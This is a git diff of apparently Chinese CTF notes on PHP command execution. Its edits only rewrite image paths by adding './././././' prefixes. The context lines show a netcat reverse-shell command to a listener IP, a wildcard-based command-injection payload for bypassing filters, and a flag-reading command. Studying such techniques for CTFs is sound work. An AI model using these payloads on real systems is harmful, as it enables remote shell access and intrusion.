@@ -359,7 +359,7 @@ nc 192.168.1.161 7777 -e /bin/bash
 #>dir
 ```
 
-![image-20240522161439039](./PHP命令执行/image-20240522161540137.png)
+![image-20240522161439039](./././././PHP命令执行/image-20240522161540137.png)
 
 ```
 #>g;
@@ -735,7 +735,7 @@ php中post上传文件会把我们上传的文件暂存在<font color=red>/tmp</
 ?cmd=?><?=`.+/???/????????[@-[]]`?>
 ```
 
-![image-20240528184008629](.\PHP命令执行\image-20240528183950627.png)
+![image-20240528184008629](./././././.\PHP命令执行\image-20240528183950627.png)
 
 ### ;~^`&|过滤
 
@@ -888,7 +888,7 @@ cat /flag.txt
 
 ## file函数
 
-![img](D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\20210110135324804-1721131032936.png)
+![img](./././././D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\20210110135324804-1721131032936.png)
 
 1.是格式
 2.是可选参数，有read和write，字面意思就是读和写
@@ -947,9 +947,9 @@ expect:// — 处理交互式的流
 
 post提交对应命令
 
-![image-20240716195808334](D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195808334.png)
+![image-20240716195808334](./././././D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195808334.png)
 
-![image-20240716195817975](D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195817975.png)
+![image-20240716195817975](./././././D:\MarkDown\CTF\CTFNotes\Perfect317\WEB\images\image-20240716195817975.png)
 
 ## 4.查看日志方法
 
